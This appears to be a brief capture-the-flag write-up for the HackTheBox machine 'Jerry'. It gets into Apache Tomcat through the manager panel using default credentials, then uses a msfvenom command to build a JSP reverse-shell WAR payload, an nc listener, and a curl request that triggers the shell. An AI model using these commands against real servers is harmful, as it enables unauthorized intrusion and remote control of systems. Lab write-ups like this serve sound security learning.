---
title: Jerry
date: 2026-03-10
tags: ctf, hackthebox, easy
excerpt: Apache Tomcat/Coyote JSP engine
---

### Nmap

```bash
PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1
```

[`http://10.10.10.95:8080/manager/html`](http://10.10.10.95:8080/manager/html) Has admin login panel running `http basic auth` 

HTTP basic authentication default creds: `tomcat:s3cret`

To get a reverse shell I used msfvenom to create a payload

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.11 LPORT=4444 -f war -a x64 -o payload.war`

then: `nc -lnvp 4444` to start a listener

then: `jar -tf payload.war`

then: `curl http://10.10.10.95:8080/payload/jobsmbdozaidck.jsp`